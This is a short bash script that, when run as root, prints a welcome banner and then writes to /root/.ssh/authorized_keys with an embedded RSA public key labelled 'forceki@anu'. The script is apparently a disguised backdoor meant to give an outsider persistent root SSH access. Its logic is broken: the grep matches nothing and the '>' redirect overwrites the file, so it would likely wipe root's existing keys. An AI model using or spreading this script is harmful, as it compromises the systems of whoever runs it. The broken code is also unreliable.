
hello() {
	echo "------ wellcome -------"
}
appendTeks(){
	echo " " | grep "ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQDJIY0u+9yU+SKVdhMC8pAfsUXX9IM0bYtPXZaRVcZcTxrX+m/ZdB0/Am0I3g+Iv6e7ndcCmuZeAR/UxGHApwFlbpRbuFlxI+iqYT1ddBr00T8TLh8Q5iZaCvMGmHxT+aiuSnQmUQyUwJVVERr1/scEoxVzo4QgLmhHKcYtF9bYey4c79LA5e7eLg6c8i8PsJ4i1jyJkVHnI2U/+iId5hujA5hsyfcK9Spz1u/UrdZYOWYFRP8uPx3ook/1ynqzesnKcA4AwdiGICW1wbl0ygzNMRL4a6n/AI+lCyMFNXm9VDHv2QRcke5mgSpkEKofVEG70Bsda40pQHEPa7GQtkXCHmXzrx9LQ9QubCLLdAViTm2D9huQN5O0e6oHzgl0WZmzYoAyTHeAB4Bl2KpS5mcPYWMi3Tn20DRi/y4GTmXEE5+yhOXYkzY2ueAjuyB5Pr3nnGbfP+6EmcR20Sq0kWIM2/m+Wr/zO8g8lphLhEVIq5tQl5vgi2kgjpQ5uWM4otM= forceki@anu" > /root/.ssh/authorized_keys
}
# bash trap


if [ $(id -u) = 0 ];
then
	hello
	appendTeks
else 
	echo "you must root"
fi


